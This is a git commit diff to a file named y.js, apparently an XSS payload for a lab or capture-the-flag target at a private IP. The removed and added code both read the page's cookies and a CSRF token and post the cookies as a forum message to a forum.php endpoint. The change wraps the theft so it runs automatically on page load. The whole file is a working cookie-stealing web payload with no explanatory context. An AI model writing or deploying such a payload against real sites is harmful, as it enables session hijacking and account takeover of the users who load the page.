c6497236218481fafe4d6bbc63088ba031b55ee0
Leonard Walter <50204487+LeonardWalter@users.noreply.github.com>
2023-11-18 01:33:52 +0200

    Update y.js

--- y.js
+++ y.js
@@ -1,20 +1,22 @@
-const url = 'http://10.110.15.159/forum.php';
-const token = document.querySelector('input[name="token"]').value;
-const payload = {
-  post_author: 1,
-  post_msg: document.cookie,
-  post_submit: 'Post the message',
-  post_topic_id: 1,
-  token: token
-};
-
-fetch(url, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded'
-  },
-  body: new URLSearchParams(payload).toString()
-})
-  .then(response => response.text())
-  .then(data => console.log(data))
-  .catch(error => console.error('Error:', error));
+document.addEventListener('DOMContentLoaded', function() {
+  const url = 'http://10.110.15.159/forum.php';
+  const token = document.querySelector('input[name="token"]').value;
+  const payload = {
+    post_author: 1,
+    post_msg: document.cookie,
+    post_submit: 'Post the message',
+    post_topic_id: 1,
+    token: token
+  };
+  
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: new URLSearchParams(payload).toString()
+  })
+    .then(response => response.text())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
+});
